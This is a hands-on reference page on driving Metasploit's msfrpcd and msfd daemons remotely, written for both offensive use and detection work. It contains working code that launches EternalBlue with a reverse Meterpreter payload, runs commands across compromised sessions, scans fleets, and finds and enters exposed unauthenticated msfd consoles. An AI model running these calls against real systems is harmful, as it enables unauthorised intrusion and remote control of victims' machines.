# Metasploit — RPC and Daemon (msfrpcd / msfd) — Hands-On Use Cases

Every scenario below either stands up one of the two daemons, or drives an already-running one from a client. Once a session/module actually fires through `msfrpcd`, the underlying module/payload mechanics are identical to `../msfconsole/02 - Hands-On Use Cases.md` and `../Meterpreter/`/`../msfvenom/` — not re-derived here. This page's original contribution is the **remote-access/API surface**: what standing the daemon up and driving it looks like, at the command and wire level.

## Contents
- [Starting msfrpcd for Remote Automation](#starting-msfrpcd-for-remote-automation)
- [Authenticating and Calling the API from Ruby](#authenticating-and-calling-the-api-from-ruby)
- [Authenticating and Calling the API from Python (pymetasploit3)](#authenticating-and-calling-the-api-from-python-pymetasploit3)
- [Raw Wire-Level Call — No Client Library](#raw-wire-level-call--no-client-library)
- [Driving a Full Console Session Remotely](#driving-a-full-console-session-remotely)
- [One-Shot Module Execution Without a Console](#one-shot-module-execution-without-a-console)
- [Team-Server-Style Shared Access](#team-server-style-shared-access)
- [Fleet-Wide Scanning via Scripted Module Calls](#fleet-wide-scanning-via-scripted-module-calls)
- [Fan-Out Commands Across Every Live Session](#fan-out-commands-across-every-live-session)
- [Persistent API Tokens for Long-Lived Integrations](#persistent-api-tokens-for-long-lived-integrations)
- [Running msfrpcd as an Always-On Backend Service](#running-msfrpcd-as-an-always-on-backend-service)
- [Chaining Metasploit Into Another C2 or SOAR Pipeline](#chaining-metasploit-into-another-c2-or-soar-pipeline)
- [OPSEC Variant: Disabling TLS for Local Automation](#opsec-variant-disabling-tls-for-local-automation)
- [Legacy msfd: Zero-Auth Shared Console Access](#legacy-msfd-zero-auth-shared-console-access)
- [Finding an Exposed msfrpcd/msfd Instance](#finding-an-exposed-msfrpcdmsfd-instance)

---

## Starting msfrpcd for Remote Automation

**MITRE ATT&CK:** [T1219](https://attack.mitre.org/techniques/T1219/) (Remote Access Software) — exposing Metasploit's own control surface as a remotely-drivable backend.

```bash
msfrpcd -U msf -P 'Sup3rSecret!Rotate-Me' -a 0.0.0.0 -p 55553 -f
```
Output confirms the bind address/port and whether SSL is active:
```
[*] MsgRPC starting on 0.0.0.0:55553 (SSL):Msg...
```
`-f` keeps it in the foreground for visibility during setup; drop it for a real deployment and the process forks to the background instead. SSL is on unless `-S` was passed — see [OPSEC Variant](#opsec-variant-disabling-tls-for-local-automation) below for what dropping it costs. This is the baseline every other scenario on this page assumes is already running.

## Authenticating and Calling the API from Ruby

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Application Layer Protocol: Web Protocols) — the RPC channel itself.

```ruby
require 'msfrpc-client'

rpc = Msf::RPC::Client.new(
  host: '10.10.14.1',
  port: 55553,
  ssl: true,
  ssl_version: 'TLS1.2'   # matches Msf::RPC::Client's own default
)

rpc.login('msf', "Sup3rSecret!Rotate-Me")
puts rpc.call('core.version').inspect
# => {"version"=>"6.x.x", "ruby"=>"3.x.x ... ", "api"=>"1.0"}
```
`Msf::RPC::Client#call` automatically prepends the stored token to every method that isn't `auth.login`/`health.check`, and transparently retries once via `re_login` if the server responds with an "Invalid Authentication Token" error — useful to know when reading a packet capture: a `re_login`-triggered retry shows up as a second `auth.login` call mid-session with no operator action behind it.

## Authenticating and Calling the API from Python (pymetasploit3)

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

```python
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('Sup3rSecret!Rotate-Me', server='10.10.14.1', port=55553, ssl=True)
print(client.call('core.version'))
```
`pymetasploit3` (actively maintained fork: `Coalfire-Research/pymetasploit3`; originally `allfro/pymetasploit`) is a third-party — **not Rapid7-authored** — Python 3 library that wraps the same MessagePack/HTTP calls behind `client.core`, `client.modules`, `client.sessions`, `client.jobs`, `client.plugins`, and `client.db` convenience objects. It's the most common way Python-based automation/orchestration tooling drives Metasploit, since the Framework itself only ships a Ruby client.

## Raw Wire-Level Call — No Client Library

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

Demonstrates exactly what a client library does under the hood — useful for a blue teamer building a Zeek/Suricata signature to know precisely what "legitimate" RPC traffic looks like on the wire:

```bash
python3 -c "
import msgpack, sys
sys.stdout.buffer.write(msgpack.packb(['auth.login', 'msf', 'Sup3rSecret!Rotate-Me']))
" | curl -sk https://10.10.14.1:55553/api \
    -H 'Content-Type: binary/message-pack' \
    --data-binary @- | python3 -c "import msgpack,sys; print(msgpack.unpackb(sys.stdin.buffer.read()))"
```
The request is nothing more than a MessagePack array `["auth.login","msf","Sup3rSecret!Rotate-Me"]` POSTed to `/api` with that exact `Content-Type`. Any malformed piece of this (wrong verb, wrong content type, non-array body) gets a specific `ArgumentError`-derived message back — `"Invalid Request Verb"`, `"Invalid Content Type"`, `"Invalid Message Format"`, `"Unknown API Group"`, `"Unknown API Call"` — which is itself useful for fingerprinting a live `msgrpc` service during a security review (see [Finding an Exposed msfrpcd/msfd Instance](#finding-an-exposed-msfrpcdmsfd-instance)).

## Driving a Full Console Session Remotely

**MITRE ATT&CK:** [T1210](https://attack.mitre.org/techniques/T1210/) (Exploitation of Remote Services) — inherited from whatever module actually runs; the RPC layer itself is a control-plane wrapper, same reasoning `../msfconsole/02 - Hands-On Use Cases.md`'s baseline scenario uses.

```ruby
cid = rpc.call('console.create')['id']

rpc.call('console.write', cid, "use exploit/windows/smb/ms17_010_eternalblue\r\n")
rpc.call('console.write', cid, "set RHOSTS 10.10.10.5\r\n")
rpc.call('console.write', cid, "set PAYLOAD windows/x64/meterpreter/reverse_tcp\r\n")
rpc.call('console.write', cid, "set LHOST 10.10.14.1\r\n")
rpc.call('console.write', cid, "run\r\n")

sleep 3
puts rpc.call('console.read', cid)['data']
```
This is the entire `search`/`use`/`set`/`run` vocabulary from `../msfconsole/01 - Overview.md` — every command that works interactively works here, byte-for-byte identical, just relayed over `console.write`/`console.read` instead of a terminal. `console.tabs` even exposes tab-completion remotely. This is the mechanism a custom GUI or CI pipeline uses to give an operator (or an automated process) the full console experience without a local `msfconsole` process at all.

## One-Shot Module Execution Without a Console

**MITRE ATT&CK:** [T1210](https://attack.mitre.org/techniques/T1210/) / [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer — staged payload's second-stage pull), same tagging as `../msfconsole/02 - Hands-On Use Cases.md`'s handler scenario.

```ruby
result = rpc.call('module.execute', 'exploit', 'windows/smb/ms17_010_eternalblue', {
  'RHOSTS'  => '10.10.10.5',
  'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
  'LHOST'   => '10.10.14.1'
})
uuid = result['uuid']

# Poll for results — module.execute is asynchronous
loop do
  res = rpc.call('module.results', uuid)
  break if res['status'] != 'running'
  sleep 2
end
rpc.call('module.ack', uuid)   # acknowledge/clear the tracked job
```
No `console.create` needed at all — this is the leaner path for a script that just wants to fire one module and get a structured result back, and it's what most orchestration/CI-driven exploitation pipelines actually use rather than the console-relay approach above. `module.check` (same call shape) runs a module's `check()` method — confirming vulnerability without exploiting — a useful lower-risk primitive for automated validation.

## Team-Server-Style Shared Access

**MITRE ATT&CK:** [T1219](https://attack.mitre.org/techniques/T1219/)

`msfrpcd`/`msgrpc` (and `msfd`, more starkly) run **one** `Msf::Simple::Framework` instance shared by every authenticated client — this is the core reason a team would use it over solo `msfconsole` instances. Two operators, two separate RPC clients, same live state:

```ruby
# Operator A's client
rpc_a.call('session.list')
# => {"1"=>{"type"=>"meterpreter", "tunnel_peer"=>"10.10.10.5:49512", ...}}

# Operator B's client, connected independently, same msfrpcd instance
rpc_b.call('session.list')
# => identical output — same session, visible to both without any handoff step
```
Any session Operator A opens is immediately visible to Operator B via `session.list`, any host/cred/loot Operator A's modules write lands in the same `db.*`-queryable database, and any job either of them starts shows up in the shared `job.list`. This is the same underlying value proposition as Cobalt Strike's team server or Sliver's multiplayer mode, built on Metasploit's own RPC layer rather than a purpose-built C2 protocol.

## Fleet-Wide Scanning via Scripted Module Calls

**MITRE ATT&CK:** [T1046](https://attack.mitre.org/techniques/T1046/) (Network Service Discovery)

```python
targets = open('targets.txt').read().splitlines()

for host in targets:
    job = client.call('module.execute', 'auxiliary', 'scanner/smb/smb_version', {'RHOSTS': host})
    print(host, job)
```
Scripting `module.execute` against a target list is how an operator drives the same `auxiliary/scanner/*` module family covered in `../Auxiliary Modules/02 - Hands-On Use Cases.md` at fleet scale without hand-typing hundreds of `set RHOSTS`/`run` cycles in an interactive console — the natural automation path once a target list exceeds what's comfortable to drive by hand.

## Fan-Out Commands Across Every Live Session

**MITRE ATT&CK:** [T1059](https://attack.mitre.org/techniques/T1059/) (Command and Scripting Interpreter)

```python
sessions = client.call('session.list')

for sid in sessions:
    if sessions[sid]['type'] == 'shell':
        client.call('session.shell_write', int(sid), "whoami\r\n")
    elif sessions[sid]['type'] == 'meterpreter':
        client.call('session.meterpreter_run_single', int(sid), 'getuid')
```
The RPC equivalent of `../msfconsole/`'s `sessions -c <cmd>`/`-C <cmd>` fleet broadcast — but scriptable with arbitrary per-session logic (different commands per session type, conditional branching, logging results to an external system) rather than one command applied uniformly.

## Persistent API Tokens for Long-Lived Integrations

**MITRE ATT&CK:** None — credential/API-key management, not an action against a target.

```ruby
token = rpc.call('auth.token_generate')['token']
# 32-char random alphanumeric token, persisted as an Mdm::ApiKey row if
# the database is connected, or held in-memory marked permanent otherwise

# A later client can use it directly — no auth.login round-trip needed
rpc2 = Msf::RPC::Client.new(host: '10.10.14.1', port: 55553, ssl: true, token: token)
rpc2.call('core.version')
```
`auth.token_add`/`auth.token_generate`-issued tokens are **not** subject to the `TokenTimeout` inactivity purge that ordinary `auth.login`-issued tokens are — they persist until explicitly revoked (`auth.logout`) or the backing `Mdm::ApiKey` row is deleted. This is how a long-running integration (a SOAR playbook, a scheduled scanning job) avoids re-authenticating with a plaintext username/password on every single run.

## Running msfrpcd as an Always-On Backend Service

**MITRE ATT&CK:** [T1543.002](https://attack.mitre.org/techniques/T1543/002/) (Create or Modify System Process: Systemd Service) — when this is being stood up as durable attacker infrastructure rather than legitimate lab/engagement tooling; context-dependent, flagged rather than asserted.

```ini
# /etc/systemd/system/msfrpcd.service
[Unit]
Description=Metasploit RPC Daemon
After=network.target postgresql.service

[Service]
Environment=MSF_RPC_USER=msf
Environment=MSF_RPC_PASS=Sup3rSecret!Rotate-Me
ExecStart=/usr/bin/msfrpcd -a 127.0.0.1 -p 55553 -f
Restart=on-failure
User=msfops

[Install]
WantedBy=multi-user.target
```
```bash
systemctl daemon-reload
systemctl enable --now msfrpcd
```
Using `MSF_RPC_USER`/`MSF_RPC_PASS` environment variables instead of `-U`/`-P` keeps the password out of the process argument list (`/proc/<pid>/cmdline`, `ps aux`) — see `03 - Source Evidence.md` for why that distinction matters to an investigator. Binding to `127.0.0.1` and fronting the service with an SSH tunnel or VPN, rather than exposing `55553` directly, is the safer deployment pattern; see `05 - Detection and Hunting.md`'s Remediation section for the inverse (what to do when you find this *without* that discipline).

## Chaining Metasploit Into Another C2 or SOAR Pipeline

**MITRE ATT&CK:** [T1219](https://attack.mitre.org/techniques/T1219/)

Conceptually, any external tool that can speak MessagePack-over-HTTP(S) can treat `msfrpcd` as an exploitation backend: a SOAR playbook validates a finding by calling `module.check`, a custom C2 framework's plugin calls `module.execute` to hand a specific target off to Metasploit for a module the operator's own implant doesn't carry, then pulls the resulting session's output back via `session.shell_read`/`session.meterpreter_read` and folds it into its own reporting. The pattern is always the same three calls — `auth.login` → `module.execute` (or `console.create`/`write`/`read`) → `session.*`/`module.results` — regardless of what's driving it; this is precisely why `msfrpcd`'s API surface (not `msfconsole`'s text UI) is the integration point of choice for third-party tooling.

## OPSEC Variant: Disabling TLS for Local Automation

**MITRE ATT&CK:** None directly — an operator configuration choice, not a technique. Its effect is to remove the applicability of [T1573](https://attack.mitre.org/techniques/T1573/) (Encrypted Channel) as a description of the resulting traffic, shifting detection to plaintext content inspection instead (see `05 - Detection and Hunting.md`).

```bash
msfrpcd -U msf -P 'Sup3rSecret!Rotate-Me' -S -a 127.0.0.1 -p 55553 -f
```
`-S` disables SSL — every request and response, including the `auth.login` credentials and every subsequent token, travels as cleartext HTTP MessagePack. This is only ever defensible on a strictly loopback or fully isolated/trusted automation network (e.g. a container-to-container call on the same host, or a lab range with no adversarial network position); on any shared or routed network it hands a passive listener the same level of access the operator has.

## Legacy msfd: Zero-Auth Shared Console Access

**MITRE ATT&CK:** [T1219](https://attack.mitre.org/techniques/T1219/) — flagged with the strongest possible caveat: `msfd`'s own plugin source describes its console as "entirely unauthenticated," so finding it reachable outside an isolated lab/range network is itself a critical misconfiguration, offensive or defensive.

```bash
msfd -a 0.0.0.0 -p 55554 -f -q
```
```bash
# From any client — no credentials, no handshake
nc 10.10.14.1 55554
msf6 > sessions -l
```
The instant TCP connect completes, the connecting party has a live `msf6 >` prompt against the shared framework instance — `-q` here just suppresses the banner text, it changes nothing about access. `-A 10.10.14.0/24` restricts by source address as the only available compensating control:
```bash
msfd -a 0.0.0.0 -p 55554 -f -A 10.10.14.10,10.10.14.11
```
Realistic legitimate use is narrow: a trusted, fully isolated training/CTF range where instructor and students share one framework instance and setup friction needs to be near zero. Outside that, `msfrpcd` (authenticated, TLS by default) is the correct choice every time.

## Finding an Exposed msfrpcd/msfd Instance

**MITRE ATT&CK:** [T1046](https://attack.mitre.org/techniques/T1046/) (Network Service Discovery) — from the discovering party's side, whether that's an attacker who's found someone else's forgotten instance, or a hunter auditing their own estate.

```bash
nmap -p 55552,55553,55554 --open -sV 10.10.14.0/24
```
A safe, unauthenticated confirmation step once a candidate port is found — `health.check` needs no token at all:
```bash
python3 -c "
import msgpack, sys
sys.stdout.buffer.write(msgpack.packb(['health.check']))
" | curl -sk https://10.10.14.1:55553/api -H 'Content-Type: binary/message-pack' --data-binary @-
```
A `200` response with MessagePack content confirms a real `msgrpc` service (vs. some other unrelated listener on the same port); for `msfd`, a raw `nc <host> 55554` connection either streams a Metasploit banner and prompt immediately (unauthenticated access achieved) or the connection is refused/reset (`-A`/`-D` filtering, or the port isn't actually `msfd`). See `04 - Target Evidence.md` for the full fingerprinting detail (including the `Server: Rex` HTTP header) and `05 - Detection and Hunting.md` for doing this defensively across an entire estate.
